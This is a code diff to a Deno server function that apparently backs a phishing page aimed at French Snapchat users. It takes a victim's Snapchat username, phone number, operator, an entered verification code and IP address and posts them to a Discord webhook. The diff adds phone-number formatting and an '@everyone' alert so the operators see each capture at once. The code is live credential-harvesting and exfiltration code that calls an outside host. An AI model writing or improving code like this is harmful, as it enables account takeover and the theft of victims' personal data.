@@ -6,6 +6,8 @@ Deno.serve(async (req) => {
   const base44 = createClientFromRequest(req);
   const { snapchat, telephone, operateur, code, submissionId } = await req.json();
 
+  const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
+
   const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
   const now = new Date();
   const dateStr = now.toLocaleDateString("fr-FR", {
@@ -28,7 +30,7 @@ Deno.serve(async (req) => {
     fields: [
       { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
       { name: "📡 Opérateur", value: operateur, inline: true },
-      { name: "📞 Numéro", value: telephone, inline: true },
+      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
       { name: "🔢 Code entré", value: `**${code}**`, inline: true },
       { name: "🌍 Pays", value: "France", inline: true },
       { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: true },
@@ -46,7 +48,7 @@ Deno.serve(async (req) => {
   await fetch(DISCORD_WEBHOOK, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ embeds: [embed] }),
+    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
   });
 
   return Response.json({ ok: true });
